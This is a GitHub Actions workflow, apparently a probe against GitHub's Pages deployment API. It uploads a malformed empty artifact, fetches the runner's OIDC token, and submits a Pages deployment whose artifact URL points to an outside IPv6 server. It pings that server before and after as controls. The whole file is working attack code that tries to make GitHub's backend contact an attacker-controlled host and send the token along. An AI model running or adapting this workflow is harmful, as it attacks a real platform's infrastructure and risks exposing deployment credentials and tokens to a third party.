name: bf45db64-v6-capture
on:
  workflow_dispatch:
permissions:
  contents: read
  pages: write
  id-token: write
  actions: read
jobs:
  capture:
    runs-on: ubuntu-latest
    environment:
      name: github-pages
    steps:
      - name: create-malformed-artifact
        uses: actions/upload-artifact@v4
        with:
          name: github-pages
          path: /dev/null
          compression-level: 9
      - name: capture
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL" | jq -r .value)
          echo "::add-mask::$TOKEN"
          API="https://api.github.com/repos/$GITHUB_REPOSITORY/pages/deployments"
          MALFORMED_ID=$(curl -s -H "Authorization: token $GH_TOKEN" "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/runs/$GITHUB_RUN_ID/artifacts" | jq -r '.artifacts[] | select(.name=="github-pages") | .id')
          echo "Artifact ID: $MALFORMED_ID"
          echo "===== CONTROL ====="
          curl -s "http://[2001:f40:952:2d6:85a2:596d:2d86:c297]:18080/v6-control-pre" || true
          echo "===== ARM ====="
          curl -s -w '\nHTTP %{http_code}\n' -X POST -H "Authorization: token $GH_TOKEN" -H "Accept: application/vnd.github+json" "$API"             -d "{\"artifact_id\":$MALFORMED_ID,\"artifact_url\":\"http://[2001:f40:952:2d6:85a2:596d:2d86:c297]:18080/_apis/pipelines/1/runs/1/artifacts?arm=B_V6\",\"pages_build_version\":\"$GITHUB_SHA\",\"oidc_token\":\"$TOKEN\",\"environment\":\"github-pages\"}"
          for i in $(seq 1 8); do sleep 15; echo "tick $((i*15))s"; done
          curl -s "http://[2001:f40:952:2d6:85a2:596d:2d86:c297]:18080/v6-control-post" || true
